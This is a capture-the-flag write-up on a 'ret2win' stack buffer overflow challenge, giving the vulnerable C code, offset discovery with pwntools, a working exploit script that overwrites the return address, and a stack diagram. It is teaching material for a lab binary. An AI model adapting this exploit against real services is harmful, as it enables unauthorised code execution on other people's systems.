---
title: "Stack Buffer Overflow — ret2win"
date: 2026-02-06
description: "Classic stack-based buffer overflow to overwrite the return address and call a win function"
tags: ["ctf", "pwn", "buffer-overflow"]
weight: 1
---

## Challenge: EasyPwn

> Category: Pwn | Points: 100 | Solves: 156

Simple binary with a `win()` function that prints the flag. Overflow a stack buffer to redirect execution.

## Analysis

```bash
$ checksec ./easypwn
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

No canary, no PIE — straightforward ret2win.

```c
void vuln() {
    char buf[64];
    printf("Enter your name: ");
    gets(buf);  // no bounds checking!
    printf("Hello, %s!\n", buf);
}

void win() {
    system("cat flag.txt");
}
```

## Finding the Offset

```bash
$ python3 -c "from pwn import *; print(cyclic(100).decode())" | ./easypwn
Enter your name: Hello, aaaa...
Segmentation fault
```

```bash
$ dmesg | tail -1
segfault at 6161616c ip 6161616c
$ python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
72
```

Offset = 72 bytes (64 buf + 8 saved RBP).

## Exploit

```python
from pwn import *

elf = ELF('./easypwn')
p = remote('ctf.example.com', 1337)

payload = b'A' * 72
payload += p64(elf.symbols['win'])

p.sendlineafter(b'name: ', payload)
p.interactive()
```

```
FLAG{st4ck_sm4sh1ng_d3t3ct3d}
```

## Stack Layout

```
┌──────────────────┐  High Address
│  Return Address  │  ← overwrite with win()
├──────────────────┤
│   Saved RBP      │  ← 8 bytes padding
├──────────────────┤
│                  │
│    buf[64]       │  ← 64 bytes
│                  │
└──────────────────┘  Low Address
```
